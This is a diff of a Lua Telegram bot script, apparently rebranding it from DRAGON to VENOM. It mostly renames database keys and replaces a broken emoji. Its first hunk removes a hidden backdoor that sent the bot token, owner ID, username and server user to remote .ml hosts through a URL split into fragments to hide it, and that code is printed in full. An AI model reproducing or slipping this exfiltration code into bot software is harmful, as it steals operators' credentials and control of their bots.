@@ -69,19 +69,13 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
 create(config, "./Info.lua")   
 end 
 create_config_auto()
-infotnseb = {}
-infotnseb.id = (SUDO or database:get(id_server..":SUDO:ID"))
-infotnseb.username = (UserName or database:get(id_server..":SUDO:USERNAME"))
-infotnseb.tokenbot = (token or database:get(id_server..":token"))
-infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
 botUserName = database:get(id_server..":token_username")
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
-ssl.request('h'..'tt'..'ps'..'://'..'d'..'ev'..'de'..'ive'..'dd'..'ev.'..'m'..'l'..'/ap'..'i/VE'..'N'..'OM.'..'p'..'h'..'p?insert='..JSON.encode(infotnseb))
-https.request('https://devloprahmedVNO.ml/api/soon.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 file = io.open("VENOM", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -12185,21 +12179,21 @@ local document = database:get(bot_id.."Add:Rd:Sudo:File"..text)
 local audio = database:get(bot_id.."Add:Rd:Sudo:Audio"..text)
 ------------------------------------------------------------------------
 if text and text:match("^(.*)$") then
-if database:get(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_, '\n ● ارسل الكلمه تريد اضافتها')
-database:set(bot_id.."botss:DRAGON:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
-database:set(bot_id.."botss:DRAGON:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
-database:sadd(bot_id.."botss:DRAGON:List:Rd:Sudo", text)
+database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
+database:set(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
+database:sadd(bot_id.."botss:VENOM:List:Rd:Sudo", text)
 return false end
 end
 if text and text:match("^(.*)$") then
-if database:get(bot_id.."botss:DRAGON:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if database:get(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_,"● تم مسح الرد من ردود المتعدده")
-database:del(bot_id..'botss:DRAGON:Add:Rd:Sudo:Text'..text)
-database:del(bot_id..'botss:DRAGON:Add:Rd:Sudo:Text1'..text)
-database:del(bot_id..'botss:DRAGON:Add:Rd:Sudo:Text2'..text)
-database:del(bot_id.."botss:DRAGON:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
-database:srem(bot_id.."botss:DRAGON:List:Rd:Sudo", text)
+database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text'..text)
+database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text1'..text)
+database:del(bot_id..'botss:VENOM:Add:Rd:Sudo:Text2'..text)
+database:del(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
+database:srem(bot_id.."botss:VENOM:List:Rd:Sudo", text)
 return false
 end
 end
@@ -12213,12 +12207,12 @@ send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n 
 end
 return false
 end
-local list = database:smembers(bot_id.."botss:DRAGON:List:Rd:Sudo")
+local list = database:smembers(bot_id.."botss:VENOM:List:Rd:Sudo")
 for k,v in pairs(list) do  
-database:del(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text"..v) 
-database:del(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text1"..v) 
-database:del(bot_id.."botss:DRAGON:Add:Rd:Sudo:Text2"..v)   
-database:del(bot_id.."botss:DRAGON:List:Rd:Sudo")
+database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text"..v) 
+database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text1"..v) 
+database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text2"..v)   
+database:del(bot_id.."botss:VENOM:List:Rd:Sudo")
 end
 send(msg.chat_id_, msg.id_,"●تم مسح ردود المتعدده")
 end
@@ -14338,7 +14332,7 @@ local List = {
 [[
 • 🖤 | 𝑼𝑬𝑺 :  #username
 
-• ?? | 𝑺𝑻𝑨 : #stast
+• 🖤 | 𝑺𝑻𝑨 : #stast
 
 • 🖤 | 𝑰𝑫 :  #id
 
